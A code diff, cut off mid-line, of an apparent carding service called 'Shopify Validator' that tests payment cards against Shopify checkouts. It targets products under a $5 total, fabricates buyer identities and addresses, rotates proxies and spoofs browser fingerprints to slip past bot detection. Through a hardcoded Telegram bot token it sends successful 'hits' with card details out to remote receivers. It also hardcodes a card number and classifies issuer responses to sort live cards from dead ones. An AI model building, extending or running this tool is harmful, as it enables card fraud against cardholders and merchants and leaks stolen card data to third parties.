@@ -1,30 +1,32 @@
 """
 Endpoints:
-  GET /shopify?site={site}&cc={card}&proxy={proxy}&max_price={price}&variant_id={id}
-  GET /check?site={site}&card={card}&proxy={proxy}&max_price={price}&variant_id={id}
+  GET /shopify?site={site}&cc={card}&proxy={proxy}&variant_id={id}&max_price={price}
+  GET /check?site={site}&card={card}&proxy={proxy}&variant_id={id}&max_price={price}
   GET /health
+  GET /stats
+  POST /cache/clear
+  POST /reload
 
 Card formats:  cc|mm|yy|cvv  or  cc|mm|yyyy|cvv
 Proxy formats: ip:port  |  ip:port:user:pass  |  host:port:user:pass  |  scheme://...
 
 Environment variables (all optional):
   PORT              Server port (default 8080)
-  WORKERS           uvicorn worker count (default 4)
+  WORKERS           uvicorn worker count (default 8)
   CARDS_FILE        Path to cards.txt (default ./cards.txt)
-  MAX_PRICE         Max product price to target (default 8.0)
-  SITE_CONCURRENCY  Max simultaneous requests per store (default 15)
-  POOL_SIZE         aiohttp global connection pool (default 500)
-  POOL_PER_HOST     aiohttp per-host connection limit (default 25)
+  MAX_PRICE         Max TOTAL (product+shipping+tax) price to target (default 5.0)
+  SITE_CONCURRENCY  Max simultaneous requests per store (default 100)
+  POOL_SIZE         aiohttp global connection pool (default 3000)
+  POOL_PER_HOST     aiohttp per-host connection limit (default 150)
   CONNECT_TIMEOUT   TCP connect timeout seconds (default 8)
-  REQUEST_TIMEOUT   Full request timeout seconds (default 35)
-  CACHE_TTL         Product cache TTL seconds (default 300)
+  REQUEST_TIMEOUT   Full request timeout seconds (default 30)
+  CACHE_TTL         Product cache TTL seconds (default 600)
   LOG_LEVEL         Logging level: debug|info|warning (default warning)
 """
 
 import asyncio
 import sys
 import copy
-
 import logging
 import os
 import random
@@ -43,12 +45,12 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 
 # ---------------------------------------------------------------------------
-# Configuration from environment  (Railway Pro defaults — 5 replicas)
+# Configuration
 # ---------------------------------------------------------------------------
 PORT             = int(os.environ.get("PORT", 8080))
 WORKERS          = int(os.environ.get("WORKERS", 8))
 CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
-MAX_PRICE        = float(os.environ.get("MAX_PRICE", 30.0))
+MAX_PRICE        = float(os.environ.get("MAX_PRICE", 5.0))   # TOTAL cap
 SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 100))
 POOL_SIZE        = int(os.environ.get("POOL_SIZE", 3000))
 POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 150))
@@ -70,11 +72,10 @@ log = logging.getLogger("shopify")
 ADMIN_HIT_SENDER_TOKEN = "8629480718:AAFLxnpZAjxVzpKIfCvGTAMRKtZ1KD3EW9o"
 ADMIN_HIT_RECEIVER_ID  = 8524951580
 
-async def send_hit_to_admin(card: str, status: str, response: str, gateway: str, price: str, site: str, reason: str = ""):
-    """Fire-and-forget Telegram notification for Charged/Approved hits."""
+async def send_hit_to_admin(card: str, status: str, response: str, gateway: str, price: str, site: str):
     try:
         from datetime import datetime as _dt
-        import urllib.request, urllib.parse, json as _json
+        import urllib.request, json as _json
 
         if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
             status_text = "\U0001f48e CHARGED"
@@ -85,8 +86,6 @@ async def send_hit_to_admin(card: str, status: str, response: str, gateway: str,
 
         time_str = _dt.now().strftime("%H:%M:%S")
 
-        reason_part = f"\n\U0001f50d <b>Reason:</b> {reason[:200]}" if reason else ""
-
         message = (
             f"<b>{status_text} \u2022 API HIT</b>\n\n"
             f"\U0001f6d2 <b>Site:</b> {site}\n"
@@ -95,12 +94,11 @@ async def send_hit_to_admin(card: str, status: str, response: str, gateway: str,
             f"\U0001f6d2 <b>Gateway:</b> {gateway}\n"
             f"\U0001f4dd <b>Response:</b> {response[:150]}\n"
             f"\U0001f4b8 <b>Price:</b> {price}"
-            f"{reason_part}"
         )
 
         receivers = [ADMIN_HIT_RECEIVER_ID, 8428369446]
         url = f"https://api.telegram.org/bot{ADMIN_HIT_SENDER_TOKEN}/sendMessage"
-        
+
         loop = asyncio.get_running_loop()
         for receiver in receivers:
             payload = _json.dumps({
@@ -115,7 +113,7 @@ async def send_hit_to_admin(card: str, status: str, response: str, gateway: str,
         pass
 
 # ---------------------------------------------------------------------------
-# GraphQL Queries
+# GraphQL Queries (unchanged)
 # ---------------------------------------------------------------------------
 _PROPOSAL_VARS = (
     "$sessionInput:SessionTokenInput!,"
@@ -283,69 +281,36 @@ POSTAL_HUBS: dict[str, list[tuple[str, str, str, list[str]]]] = {
         ("Phoenix", "AZ", "85001", ["602", "480"]), ("Philadelphia", "PA", "19102", ["215", "267"]),
         ("Atlanta", "GA", "30303", ["404", "678"]), ("Las Vegas", "NV", "89101", ["702"]),
         ("Portland", "OR", "97201", ["503", "971"]), ("Detroit", "MI", "48226", ["313"]),
-        ("Minneapolis", "MN", "55401", ["612"]), ("St. Louis", "MO", "63101", ["314"]),
-        ("Charlotte", "NC", "28202", ["704", "980"]), ("Nashville", "TN", "37201", ["615"]),
-        ("Salt Lake City", "UT", "84101", ["801"]), ("Columbus", "OH", "43215", ["614"]),
-        ("Indianapolis", "IN", "46204", ["317"]), ("Baltimore", "MD", "21201", ["410", "443"]),
-        ("Milwaukee", "WI", "53202", ["414"]), ("Honolulu", "HI", "96813", ["808"]),
     ],
     "CA": [
         ("Toronto", "ON", "M5V 3L9", ["416", "647", "437"]), ("Vancouver", "BC", "V6Z 2K5", ["604", "778"]),
         ("Montreal", "QC", "H3B 4L4", ["514", "438"]), ("Calgary", "AB", "T2P 1G8", ["403", "587"]),
-        ("Ottawa", "ON", "K1P 5J2", ["613"]), ("Edmonton", "AB", "T5J 0N3", ["780"]),
-        ("Winnipeg", "MB", "R3C 1A5", ["204"]), ("Quebec City", "QC", "G1R 2J7", ["418"]),
-        ("Halifax", "NS", "B3J 2B6", ["902"]), ("Victoria", "BC", "V8W 1P6", ["250"]),
     ],
     "GB": [
         ("London", "ENG", "SW1A 1AA", ["207", "208"]), ("Manchester", "ENG", "M3 2GQ", ["161"]),
         ("Edinburgh", "SCT", "EH2 2LE", ["131"]), ("Birmingham", "ENG", "B2 4PF", ["121"]),
-        ("Leeds", "ENG", "LS1 2ES", ["113"]), ("Glasgow", "SCT", "G2 1DY", ["141"]),
-        ("Bristol", "ENG", "BS1 4DJ", ["117"]), ("Liverpool", "ENG", "L1 8JQ", ["151"]),
-        ("Cardiff", "WLS", "CF10 1EP", ["29"]), ("Belfast", "NIR", "BT1 5GS", ["28"]),
     ],
     "AU": [
         ("Sydney", "NSW", "2000", ["02"]), ("Melbourne", "VIC", "3000", ["03"]),
         ("Brisbane", "QLD", "4000", ["07"]), ("Perth", "WA", "6000", ["08"]),
-        ("Adelaide", "SA", "5000", ["08"]), ("Canberra", "ACT", "2601", ["02"]),
     ],
     "DE": [
         ("Berlin", "BE", "10117", ["030"]), ("Munich", "BY", "80331", ["089"]),
         ("Frankfurt", "HE", "60313", ["069"]), ("Hamburg", "HH", "20095", ["040"]),
-        ("Cologne", "NW", "50667", ["0221"]), ("Stuttgart", "BW", "70173", ["0711"]),
     ],
     "FR": [
         ("Paris", "IDF", "75008", ["01"]), ("Lyon", "ARA", "69001", ["04"]),
-        ("Marseille", "PAC", "13001", ["04"]), ("Bordeaux", "NAQ", "33000", ["05"]),
-        ("Nice", "PAC", "06000", ["04"]), ("Toulouse", "OCC", "31000", ["05"]),
+        ("Marseille", "PAC", "13001", ["04"]),
     ],
     "IT": [
         ("Rome", "RM", "00186", ["06"]), ("Milan", "MI", "20121", ["02"]),
-        ("Naples", "NA", "80132", ["081"]), ("Turin", "TO", "10121", ["011"]),
-        ("Florence", "FI", "50123", ["055"]), ("Bologna", "BO", "40121", ["051"]),
     ],
     "ES": [
         ("Madrid", "MD", "28013", ["91"]), ("Barcelona", "CT", "08007", ["93"]),
-        ("Valencia", "VC", "46002", ["96"]), ("Seville", "AN", "41001", ["95"]),
     ],
     "NL": [
         ("Amsterdam", "NH", "1012 LM", ["020"]), ("Rotterdam", "ZH", "3011 AL", ["010"]),
-        ("The Hague", "ZH", "2511 CR", ["070"]), ("Utrecht", "UT", "3511 AX", ["030"]),
     ],
-    "SE": [("Stockholm", "AB", "111 51", ["08"]), ("Gothenburg", "O", "411 06", ["031"])],
-    "NO": [("Oslo", "03", "0154", ["22"]), ("Bergen", "46", "5003", ["55"])],
-    "DK": [("Copenhagen", "84", "1165", ["33"]), ("Aarhus", "82", "8000", ["86"])],
-    "CH": [("Zurich", "ZH", "8001", ["044"]), ("Geneva", "GE", "1201", ["022"])],
-    "NZ": [("Auckland", "AUK", "1010", ["09"]), ("Wellington", "WGN", "6011", ["04"])],
-    "IE": [("Dublin", "D", "D02 X285", ["01"]), ("Cork", "CO", "T12 K8N3", ["021"])],
-    "SG": [("Singapore", "01", "048616", ["65"]), ("Singapore", "02", "238801", ["65"])],
-    "HK": [("Central", "HK", "000000", ["852"]), ("Kowloon", "KLN", "000000", ["852"])],
-    "JP": [("Tokyo", "13", "100-0005", ["03"]), ("Osaka", "27", "530-0001", ["06"])],
-    "BR": [("Sao Paulo", "SP", "01310-100", ["11"]), ("Rio de Janeiro", "RJ", "20040-002", ["21"])],
-    "MX": [("Mexico City", "CMX", "06600", ["55"]), ("Guadalajara", "JAL", "44100", ["33"])],
-    "IN": [("Mumbai", "MH", "400001", ["022"]), ("New Delhi", "DL", "110001", ["011"]), ("Bangalore", "KA", "560001", ["080"])],
-    "AE": [("Dubai", "DU", "00000", ["04"]), ("Abu Dhabi", "AZ", "00000", ["02"])],
-    "ZA": [("Johannesburg", "GT", "2001", ["011"]), ("Cape Town", "WC", "8001", ["021"])],
-    "KR": [("Seoul", "11", "04524", ["02"]), ("Busan", "26", "48058", ["051"])],
     "DEFAULT": [
         ("New York", "NY", "10007", ["212", "646"]), ("San Francisco", "CA", "94108", ["415", "628"]),
         ("Chicago", "IL", "60601", ["312"]), ("London", "ENG", "SW1A 1AA", ["207"]),
@@ -353,61 +318,26 @@ POSTAL_HUBS: dict[str, list[tuple[str, str, str, list[str]]]] = {
 }
 
 STREET_POOLS: dict[str, list[str]] = {
-    "EN": [
-        "Main St", "Oak Ave", "Maple Blvd", "Park Ave", "Washington St", "Elm St", "Cedar Rd",
-        "Lakeview Dr", "Sunset Blvd", "Broadway", "Pine St", "Chestnut St", "Walnut St",
-        "Market St", "Mission St", "Boylston St", "Beacon St", "Peachtree St", "Michigan Ave",
-        "Fulton St", "Lexington Ave", "Madison Ave", "Fifth Ave", "Congress Ave", "Wynkoop St",
-        "High St", "Church St", "Spring St", "Union St", "Court St", "River Rd", "Hillside Ave",
-        "Queen St", "King St", "Victoria St", "George St", "Albert St", "William St", "Elizabeth St",
-        "Baker St", "Oxford St", "Regent St", "Strand", "Piccadilly", "Fleet St", "Deansgate",
-    ],
-    "DE": [
-        "Hauptstrasse", "Bahnhofstrasse", "Schillerstrasse", "Goethestrasse", "Gartenstrasse",
-        "Berliner Strasse", "Lindenstrasse", "Mozartstrasse", "Friedrichstrasse", "Königstrasse",
-    ],
-    "FR": [
-        "Rue de la Paix", "Avenue Victor Hugo", "Rue Nationale", "Boulevard Haussmann",
-        "Rue Gambetta", "Avenue Jean Jaurès", "Rue de Rivoli", "Avenue des Champs-Élysées",
-    ],
-    "ES": [
-        "Gran Vía", "Calle Mayor", "Avenida de la Constitución", "Calle Real", "Paseo de la Reforma",
-        "Avenida Insurgentes", "Calle Hidalgo", "Calle Juárez", "Avenida Balmes", "Passeig de Gràcia",
-    ],
-    "IT": [
-        "Via Roma", "Via Garibaldi", "Via Mazzini", "Via Dante", "Corso Vittorio Emanuele",
-        "Via XX Settembre", "Via Verdi", "Corso Buenos Aires", "Via Cavour", "Corso Umberto I",
-    ],
+    "EN": ["Main St", "Oak Ave", "Maple Blvd", "Park Ave", "Washington St", "Elm St", "Cedar Rd",
+           "Lakeview Dr", "Sunset Blvd", "Broadway", "Pine St", "Market St", "Mission St",
+           "High St", "Church St", "Spring St", "Union St", "Court St"],
+    "DE": ["Hauptstrasse", "Bahnhofstrasse", "Schillerstrasse", "Goethestrasse", "Gartenstrasse"],
+    "FR": ["Rue de la Paix", "Avenue Victor Hugo", "Rue Nationale", "Boulevard Haussmann"],
+    "ES": ["Gran Vía", "Calle Mayor", "Avenida de la Constitución", "Calle Real"],
+    "IT": ["Via Roma", "Via Garibaldi", "Via Mazzini", "Via Dante", "Corso Vittorio Emanuele"],
 }
 
 FIRST_NAMES = [
     "James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
     "Christopher","Daniel","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Joshua",
-    "Kenneth","Kevin","Brian","George","Timothy","Ronald","Edward","Jason","Jeffrey","Ryan",
-    "Jacob","Gary","Nicholas","Eric","Jonathan","Stephen","Larry","Justin","Scott","Brandon",
-    "Benjamin","Samuel","Gregory","Alexander","Frank","Patrick","Raymond","Jack","Dennis","Jerry",
-    "Tyler","Aaron","Jose","Adam","Nathan","Henry","Douglas","Zachary","Peter","Kyle",
     "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen",
     "Emily","Nancy","Lisa","Margaret","Betty","Sandra","Ashley","Dorothy","Kimberly","Donna",
-    "Carol","Michelle","Emily","Helen","Amanda","Melissa","Deborah","Stephanie","Rebecca","Laura",
-    "Sharon","Cynthia","Kathleen","Amy","Shirley","Angela","Anna","Brenda","Pamela","Nicole",
-    "Samantha","Katherine","Emma","Ruth","Christine","Catherine","Debra","Rachel","Carolyn","Janet",
-    "Virginia","Maria","Heather","Diane","Julie","Joyce","Victoria","Kelly","Christina","Lauren"
 ]
 LAST_NAMES = [
     "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
     "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin",
-    "Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson",
-    "Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores",
-    "Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts",
-    "Gomez","Phillips","Evans","Turner","Diaz","Parker","Cruz","Edwards","Collins","Reyes",
-    "Stewart","Morris","Morales","Murphy","Cook","Rogers","Gutierrez","Ortiz","Morgan","Cooper",
-    "Peterson","Bailey","Reed","Kelly","Howard","Ramos","Kim","Cox","Ward","Richardson",
-    "Watson","Brooks","Chavez","Wood","James","Bennett","Gray","Mendoza","Ruiz","Hughes",
-    "Price","Alvarez","Castillo","Sanders","Patel","Myers","Long","Ross","Foster","Jimenez"
 ]
-EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com",
-                 "live.com","mail.com","aol.com","gmx.com","zoho.com","yandex.com"]
+EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com"]
 
 BROWSER_PROFILES = [
     {
@@ -419,14 +349,6 @@ BROWSER_PROFILES = [
         "accept_language": "en-US,en;q=0.9",
     },
     {
-        "impersonate": "chrome124",
-        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-        "sec_ch_ua_mobile": "?0",
-        "sec_ch_ua_platform": '"macOS"',
-        "accept_language": "en-US,en;q=0.9",
-    },
-    {
         "impersonate": "chrome120",
         "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
@@ -435,43 +357,11 @@ BROWSER_PROFILES = [
         "accept_language": "en-US,en;q=0.9",
     },
     {
-        "impersonate": "chrome119",
-        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
-        "sec_ch_ua_mobile": "?0",
-        "sec_ch_ua_platform": '"Windows"',
-        "accept_language": "en-US,en;q=0.9",
-    },
-    {
-        "impersonate": "chrome116",
-        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-        "sec_ch_ua_mobile": "?0",
-        "sec_ch_ua_platform": '"Windows"',
-        "accept_language": "en-US,en;q=0.8",
-    },
-    {
         "impersonate": "safari17_0",
         "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
         "sec_ch_ua": None,
         "sec_ch_ua_mobile": None,
         "sec_ch_ua_platform": None,
-        "accept_language": "en-US,en;q=0.9",
-    },
-    {
-        "impersonate": "safari15_5",
-        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
-        "sec_ch_ua": None,
-        "sec_ch_ua_mobile": None,
-        "sec_ch_ua_platform": None,
-        "accept_language": "en-GB,en;q=0.9",
-    },
-    {
-        "impersonate": "edge101",
-        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53",
-        "sec_ch_ua": '" Microsoft Edge";v="101", "Chromium";v="101", "Not=A?Brand";v="99"',
-        "sec_ch_ua_mobile": "?0",
-        "sec_ch_ua_platform": '"Windows"',
         "accept_language": "en-US,en;q=0.9",
     },
 ]
@@ -483,21 +373,17 @@ _shared_session: Optional[AsyncSession] = None
 _site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
     lambda: asyncio.Semaphore(SITE_CONCURRENCY)
 )
-
 _product_cache: dict[str, dict] = {}
 _cards_cache: list[dict] = []
 _cards_loaded_at: float  = 0.0
 
 
-# ---------------------------------------------------------------------------
-# App lifecycle
-# ---------------------------------------------------------------------------
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     global _shared_session
     _shared_session = AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT)
     _reload_cards()
-    log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site", POOL_SIZE, SITE_CONCURRENCY)
+    log.warning("Shopify Validator API v4.0 started pool=%d/host concurrency=%d/site", POOL_SIZE, SITE_CONCURRENCY)
     yield
     if _shared_session:
         res = _shared_session.close()
@@ -505,8 +391,7 @@ async def lifespan(app: FastAPI):
             await res
 
 
-app = FastAPI(title="Shopify Validator", version="3.2.0", lifespan=lifespan)
-
+app = FastAPI(title="Shopify Validator", version="4.0.0", lifespan=lifespan)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -521,7 +406,6 @@ _stats: dict[str, int] = defaultdict(int)
 # ---------------------------------------------------------------------------
 # Utility helpers
 # ---------------------------------------------------------------------------
-
 def _reload_cards() -> None:
     global _cards_cache, _cards_loaded_at
     _cards_cache  = _load_cards_from_file()
@@ -539,7 +423,6 @@ def _load_cards_from_file() -> list[dict]:
     if not cards:
         cards = [
             {"cc": "4031630422575208", "month": "01", "year": "30", "cvv": "280"},
-            {"cc": "4242424242424242", "month": "12", "year": "28", "cvv": "123"},
         ]
     return cards
 
@@ -552,7 +435,6 @@ def _get_cards() -> list[dict]:
 
 
 def _parse_card(raw: str) -> Optional[dict]:
-    """Accept cc|mm|yy|cvv and cc|mm|yyyy|cvv.  Returns normalized dict or None."""
     raw = raw.strip()
     if not raw or raw.startswith("#"):
         return None
@@ -609,7 +491,7 @@ def _pick_address(url: str, currency: Optional[str] = None) -> dict:
         locale_map = {
             "US": "en_US", "CA": "en_CA", "GB": "en_GB", "AU": "en_AU",
             "DE": "de_DE", "FR": "fr_FR", "IT": "it_IT", "ES": "es_ES",
-            "NL": "nl_NL", "BR": "pt_BR", "MX": "es_MX", "JP": "ja_JP", "IN": "en_IN"
+            "NL": "nl_NL",
         }
         loc = locale_map.get(country)
         if loc:
@@ -667,7 +549,6 @@ def _random_identity() -> tuple[str, str, str]:
         f"{first.lower()}.{last.lower()}{random.randint(1,99)}@{domain}",
         f"{first.lower()}_{last.lower()}_{year}@{domain}",
         f"{first.lower()}{last.lower()}{year}@{domain}",
-        f"{first.lower()[0]}{last.lower()}{random.randint(100,999)}@{domain}",
     ])
     return first, last, email
 
@@ -704,94 +585,137 @@ def _extract_sst(text: str, headers: dict) -> Optional[str]:
     return None
 
 
-def _normalize_response(raw: Optional[str]) -> str:
+# ---------------------------------------------------------------------------
+# Response classification  (CARD vs SITE ERROR separation)
+# ---------------------------------------------------------------------------
+
+# Card-side outcomes (the card was actually attempted and rejected)
+CARD_DECLINE_KEYWORDS = (
+    "INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "SECURITY_CODE",
+    "CVV_FAILURE", "INCORRECT_CVC", "CVC_CHECK_FAILED", "CVV_CHECK_FAILED",
+    "DO_NOT_HONOR", "INSUFFICIENT_FUNDS", "INSUFFICIENT", "NOT_SUFFICIENT_FUNDS",
+    "EXCEEDS_BALANCE", "EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION",
+    "INCORRECT_ZIP", "ZIP_MISMATCH", "AVS_REJECTED", "AVS_FAILED",
+    "INCORRECT_ADDRESS", "INVALID_BILLING_ADDRESS", "CALL_ISSUER",
+    "REFER_TO_ISSUER", "CONTACT_ISSUER", "AMOUNT_TOO_LARGE",
+    "TRANSACTION_LIMIT_EXCEEDED", "LIMIT_EXCEEDED", "FRAUD_SUSPECTED",
+    "HIGH_RISK_FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "RISK_HIGH", "MERCHANT_RULE",
+    "INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD", "INCORRECT_NUMBER",
+    "BAD_NUMBER", "INVALID_ACCOUNT", "CARD_NOT_SUPPORTED", "INVALID_PAYMENT_METHOD",
+    "LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION", "PICKUP_CARD",
+    "STOP_PAYMENT", "GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
+    "NOT_PERMITTED", "SERVICE_NOT_ALLOWED", "CARD_TESTING",
+    "PAYMENT_DECLINED", "CARD_DECLINED", "CHARGE_DECLINED", "CARD_WAS_DECLINED",
+)
+
+# 3DS-side outcomes
+THREEDS_KEYWORDS = (
+    "ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP", "REDIRECT_TO_3DS",
+    "COMPLETE_PAYMENT", "CHALLENGE", "AUTHENTICATION_REQUIRED",
+    "AUTHENTICATION_FAILED", "THREEDSSECURE", "THREE_D_SECURE", "3D_SECURE",
+    "SCA_REQUIRED", "3DS_FAILED", "CONFIRMATION_REJECTED",
+)
+
+# Site-side errors — NOT card decline
+SITE_ERROR_KEYWORDS = (
+    "CAPTCHA", "BOT_DETECTED", "ACCESS_DENIED", "BLOCKED", "FORBIDDEN",
+    "RATE_LIMITED", "THROTTLED", "TOO_MANY_REQUESTS", "RATE_LIMIT",
+    "SESSION_EXPIRED", "SESSION_INVALID", "TOKEN_EXPIRED", "INVALID_SESSION",
+    "LOGIN_REQUIRED", "ACCOUNT_REQUIRED", "CUSTOMER_DISABLED",
+    "PASSWORD_REQUIRED", "STORE_CLOSED", "STORE_UNAVAILABLE", "STORE_PASSWORD",
+    "CHECKOUT_DISABLED", "CHECKOUT_UNAVAILABLE", "PAYMENTS_DISABLED",
+    "OUT_OF_STOCK", "SOLD_OUT", "INVENTORY_CLAIM", "INVENTORY_RESERVATION",
+)
+
+
+def classify_raw(raw: str) -> str:
+    """
+    Classify a raw provider/site message into a normalized code.
+    Returns one of:
+      ORDER_PLACED, 3DS_REQUIRED, INVALID_CVC, DO_NOT_HONOR,
+      INSUFFICIENT_FUNDS, EXPIRED_CARD, INCORRECT_ZIP, CALL_ISSUER,
+      LIMIT_EXCEEDED, HIGH_RISK, INVALID_CARD, CARD_DECLINED,
+      SITE_ERROR, THROTTLED, SESSION_EXPIRED, SITE_REQUIRES_LOGIN,
+      NO_PRODUCT
+    """
     if not raw:
         return "CARD_DECLINED"
-    msg = str(raw).upper()
+    msg = raw.upper()
 
-    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED", "SUBMITSUCCESS")):
+    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE",
+                              "ORDER_CREATED", "SUBMITSUCCESS")):
         return "ORDER_PLACED"
-    # 3DS detection — broader patterns
-    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
-                               "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
-                               "AUTHENTICATION_REQUIRED", "AUTHENTICATION_FAILED",
-                               "THREEDSSECURE", "THREE_D_SECURE", "3D_SECURE",
-                               "SCA_REQUIRED", "3DS_FAILED", "CONFIRMATION_REJECTED",
-                               "COMPLETE_PAYMENT_CHALLENGE", "COMPLETEPAYMENTCHALLENGE",
-                               "COMPLETEPAYMENTCHALLENGEV2", "3DS2", "3D-SECURE", "EMV3DS",
-                               "PENDING_AUTH", "PENDINGAUTH", "OFFSITE_REDIRECT")):
+
+    if any(k in msg for k in THREEDS_KEYWORDS):
         return "3DS_REQUIRED"
-    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
-                               "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
-                               "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
+
+    # Site-side first (so site errors are not misclassified as card declines)
+    if any(k in msg for k in ("SESSION_EXPIRED", "SESSION_INVALID",
+                              "TOKEN_EXPIRED", "INVALID_SESSION")):
+        return "SESSION_EXPIRED"
+    if any(k in msg for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
+                              "CUSTOMER_DISABLED", "PASSWORD_REQUIRED",
+                              "STORE_PASSWORD")):
+        return "SITE_REQUIRES_LOGIN"
+    if any(k in msg for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS",
+                              "RATE_LIMITED", "RETRY_LATER")):
+        return "THROTTLED"
+    if any(k in msg for k in ("CAPTCHA", "BOT_DETECTED", "ACCESS_DENIED",
+                              "BLOCKED", "FORBIDDEN")):
+        return "SITE_ERROR"
+    if any(k in msg for k in ("CHECKOUT_DISABLED", "CHECKOUT_UNAVAILABLE",
+                              "PAYMENTS_DISABLED", "STORE_CLOSED",
+                              "STORE_UNAVAILABLE")):
+        return "SITE_ERROR"
+    if any(k in msg for k in ("OUT_OF_STOCK", "SOLD_OUT",
+                              "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
+        return "NO_PRODUCT"
+
+    # Card-side
+    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE",
+                              "CVC_FAILURE", "SECURITY_CODE",
+                              "CVV_FAILURE", "INCORRECT_CVC",
+                              "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
         return "INVALID_CVC"
-    if any(k in msg for k in ("DO_NOT_HONOR",)):
+    if "DO_NOT_HONOR" in msg:
         return "DO_NOT_HONOR"
     if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT",
-                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
+                              "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
         return "INSUFFICIENT_FUNDS"
-    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
+    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY",
+                              "EXPIRATION")):
         return "EXPIRED_CARD"
-    if any(k in msg for k in ("INCORRECT_ZIP", "ZIP_MISMATCH", "AVS_REJECTED", "AVS_FAILED", "INCORRECT_ADDRESS", "INVALID_BILLING_ADDRESS")):
+    if any(k in msg for k in ("INCORRECT_ZIP", "ZIP_MISMATCH", "AVS_REJECTED",
+                              "AVS_FAILED", "INCORRECT_ADDRESS",
+                              "INVALID_BILLING_ADDRESS")):
         return "INCORRECT_ZIP"
-    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
+    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER",
+                              "CONTACT_ISSUER")):
         return "CALL_ISSUER"
-    if any(k in msg for k in ("AMOUNT_TOO_LARGE", "TRANSACTION_LIMIT_EXCEEDED", "LIMIT_EXCEEDED")):
+    if any(k in msg for k in ("AMOUNT_TOO_LARGE", "TRANSACTION_LIMIT_EXCEEDED",
+                              "LIMIT_EXCEEDED")):
         return "LIMIT_EXCEEDED"
-    if any(k in msg for k in ("FRAUD_SUSPECTED", "HIGH_RISK_FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "RISK_HIGH", "MERCHANT_RULE")):
+    if any(k in msg for k in ("FRAUD_SUSPECTED", "HIGH_RISK_FRAUD_SUSPECTED",
+                              "SUSPECTED_FRAUD", "RISK_HIGH", "MERCHANT_RULE")):
         return "HIGH_RISK"
-    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
